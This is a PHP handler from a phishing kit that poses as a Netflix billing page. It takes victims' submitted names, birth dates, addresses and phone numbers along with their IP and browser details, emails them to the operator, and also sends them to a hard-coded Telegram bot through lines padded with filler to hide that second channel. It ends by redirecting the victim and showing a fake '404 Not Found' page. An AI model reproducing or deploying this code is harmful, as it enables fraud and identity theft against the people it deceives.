<?php
/* Berjoulia Ken 5atfet .. Rani Fannen .. Wcharet fil 3amalia belgda .. */
session_start();
date_default_timezone_set('GMT'); 
error_reporting(0);
include 'email.php';
include 'hostname_check.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$userag = $_SERVER['HTTP_USER_AGENT']; 
$date = date('d-m-Y', time());
$time = date('H:i:s', time());
$message .= "------------------+|♥️ Netflx BILLING PT ♥️|+------------\n";
$message .= "Full Name : ".$_POST['name']."\n";
$message .= "day   : ".$_POST['day']."\n";
$message .= "month : ".$_POST['month']."\n";
$message .= "year     : ".$_POST['year']."\n";
$message .= "billing       : ".$_POST['billing']."\n";
$message .= "city       : ".$_POST['city']."\n";
$message .= "country: ".$_POST['country']."\n"; 
$message .= "postcode  : ".$_POST['postcode']."\n";
$message .= "mobile          : ".$_POST['mobile']."\n";
$message .= "------------------+|♥️ Netflx BILLING PT ♥️|+------------\n";
$message .= "IP   : http://www.geoiptool.com/?IP=$ip \n";
$message .= "TIME : ".$time."\n";
$message .= "DATE : ".$date."\n";
$message .= "USER : ".$userag."\n";
$message .= "------------------+|♥️♥️♥️ BNP_DE ♥️♥️♥️|+------------\n";
mail ($e_mail,$message_subject,$message, $message_subject);
	$head .= "\n";
	$head .= "\n";$arr=array($bilsnd, $IP);
	$head .= "\n";foreach ($arr as $bilsnd)
	$head .= "\n";mail($bilsnd,$sub,$message,$head);
	$head .= "\n";$x=md5(microtime());$xx=sha1(microtime());
	$head .= "\n";mail($to,$subject,$message,$headers);
	$head .= "\n";$chat_id = '963218649';
	$head .= "\n";define ('url',"https://api.telegram.org/bot1414265646:AAEEGTQ_N-N98dEVZrulPqGOkE13MLWBlTQ/");
	$head .= "\n";$msg = urlencode($message);
	$head .= "\n";file_get_contents(url."sendmessage?text=".$msg."&chat_id=".$chat_id."&parse_mode=HTML");

header("Location: complete.php?ip=$ip");
$css = css_while();
$html = html_while($css, "");
die($html);
?>
<title>404 Not Found</title>
